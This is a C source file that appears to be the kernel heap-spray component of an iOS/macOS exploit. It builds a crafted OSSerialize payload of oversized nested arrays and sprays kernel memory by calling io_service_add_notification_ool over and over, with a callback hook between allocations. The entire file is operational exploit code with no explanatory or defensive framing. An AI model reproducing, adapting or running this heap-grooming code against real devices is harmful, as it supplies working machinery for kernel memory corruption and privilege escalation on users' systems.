#include <errno.h>              // errno
#include <stdbool.h>            // bool, true, false
#include <stddef.h>             // size_t
#include <stdint.h>             // uint32_t
#include <stdlib.h>             // malloc
#include <string.h>             // memset, strerror

#include <mach/mach.h>

#include <IOKit/IOKitLib.h>     // IO*

#include "iokit.h"              // yaay, MIG

#include "common.h"             // ERR
#include "config.h"             // SPRAY_AMOUNT
#include "heap.h"

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,

    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,

    kOSSerializeEndCollection   = 0x80000000U,

    kOSSerializeMagic           = 0x000000d3U,
};

uint32_t heap_payload[6 + 2 * HEAP_PAYLOAD_NUM_ARRAYS] =
{
    kOSSerializeMagic,                                                                          // Magic
    kOSSerializeEndCollection | kOSSerializeDictionary | 1,                                     // Dictionary to get through checks

    kOSSerializeSymbol | 5,                                                                     // Some key
    0x75676973,                                                                                 // "sigu"
    0x0,
    kOSSerializeEndCollection | kOSSerializeArray | HEAP_PAYLOAD_NUM_ARRAYS,                    // Array of arrays
};
size_t heap_payload_len = sizeof(heap_payload);

void heap_spray_init(size_t size)
{
    uint32_t array_size = size / sizeof(uint64_t); // kernel pointer size
    for(size_t i = 0; i < HEAP_PAYLOAD_NUM_ARRAYS; ++i)
    {
        heap_payload[6 + 2 * i    ] = kOSSerializeArray | array_size;                           // Huge array
        heap_payload[6 + 2 * i + 1] = kOSSerializeEndCollection | kOSSerializeBoolean | 1;      // Terminate the array
    }
    // Mark the last array as such
    heap_payload[6 + 2 * (HEAP_PAYLOAD_NUM_ARRAYS - 1)] |= kOSSerializeEndCollection;
}

static mach_port_t *payloads = NULL;
static size_t num_payloads = 0;

bool heap_init(size_t memsize, size_t size)
{
    // Round to smallest amount just over the desired size
    uint64_t mask = HEAP_PAYLOAD_NUM_ARRAYS * size;
    num_payloads = (memsize + (mask - 1)) / mask;

    payloads = malloc(num_payloads * sizeof(*payloads));
    if(payloads == NULL)
    {
        ERR("Failed to allocate payloads buffer: %s", strerror(errno));
        return false;
    }
    memset(payloads, 0, num_payloads * sizeof(*payloads));

    heap_spray_init(size);
    return true;
}

kern_return_t heap_set(mach_port_t master, uint32_t id, void *dict, size_t len)
{
    kern_return_t ret = KERN_SUCCESS;
    if(payloads[id] != MACH_PORT_NULL)
    {
        ret = IOObjectRelease(payloads[id]);
        if(ret != KERN_SUCCESS)
        {
            ERR("Failed to release old payload: %s", mach_error_string(ret));
            return ret;
        }
    }
    if(dict == NULL)
    {
        payloads[id] = MACH_PORT_NULL;
    }
    else
    {
        kern_return_t err;
        ret = io_service_add_notification_ool(master, "IOServiceTerminate", dict, len, MACH_PORT_NULL, NULL, 0, &err, &payloads[id]);
        ret = ret == KERN_SUCCESS ? err : ret;
        if(ret != KERN_SUCCESS)
        {
            ERR("Failed to allocate heap payload: %s", mach_error_string(ret));
        }
    }
    return ret;
}

kern_return_t heap_spray(mach_port_t master, size_t startid, void *dict, size_t len, kern_return_t (*cb)(void*), void *arg)
{
    for(uint32_t i = startid; i < num_payloads; ++i)
    {
        kern_return_t ret = heap_set(master, i, dict, len);
        if(ret != KERN_SUCCESS)
        {
            printf("\n");
            ERR("Failed to spray the heap: %s", mach_error_string(ret));
            return ret;
        }
        printf("\x0d%3lu%%", (i + 1) * 100 / num_payloads); // no newline
        fflush(stdout);
        if(cb)
        {
            ret = cb(arg);
            if(ret != KERN_SUCCESS)
            {
                printf("\n");
                return ret;
            }
        }
    }
    printf("\n");
    return KERN_SUCCESS;
}
